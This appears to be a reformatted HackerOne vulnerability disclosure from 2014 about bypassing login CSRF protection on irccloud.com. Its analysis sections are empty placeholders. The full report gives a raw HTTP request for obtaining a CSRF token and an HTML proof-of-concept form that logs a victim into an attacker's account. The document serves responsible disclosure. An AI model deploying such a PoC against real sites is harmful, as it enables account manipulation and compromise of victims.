# Login CSRF can be bypassed (Similar approach to previous one).

## Metadata
- **Source:** HackerOne
- **Report:** 7531 | https://hackerone.com/reports/7531
- **Submitted:** 2014-04-14
- **Reporter:** uname
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
The login CSRF protection currently implemented is not adequate and can be bypassed pretty easily.

An attacker can easily obtain a CSRF token from the server by initiating the following request:

POST /chat/auth-formtoken HTTP/1.1
Host: www.irccloud.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0
Accept: application/json, text/javascript, /; q=0.01

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

The login CSRF protection currently implemented is not adequate and can be bypassed pretty easily.

An attacker can easily obtain a CSRF token from the server by initiating the following request:

POST /chat/auth-formtoken HTTP/1.1
Host: www.irccloud.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://www.irccloud.com/
Content-Length: 8
Cookie: session=
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

_reqid=1

Once this request is sent an attacker would receive a valid CSRF token. In my case I received "1397481736.3b1f59ae47e1a139e8a631b2589dfae2"

Once I have a valid CSRF token, I can conduct a login CSRF attack against a victim using the following PoC. Notice the CSRF token is the one received above.

<html>
  <body>
    <form action="https://www.irccloud.com/chat/login" method="POST">
      <input type="hidden" name="email" value="ATTACKER-EMAIL" />
      <input type="hidden" name="password" value="ATTACKER-PASSWORD" />
      <input type="hidden" name="org&#95;invite" value="" />
      <input type="hidden" name="token" value="1397481736&#46;3b1f59ae47e1a139e8a631b2589dfae2" />
      <input type="hidden" name="&#95;reqid" value="2" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

This has basically defeated the CSRF protection offered by the application. When a victim submits the above request, the victim would be logged into the attackers account.


</details>

---
*Analysed by Claude on 2026-05-24*
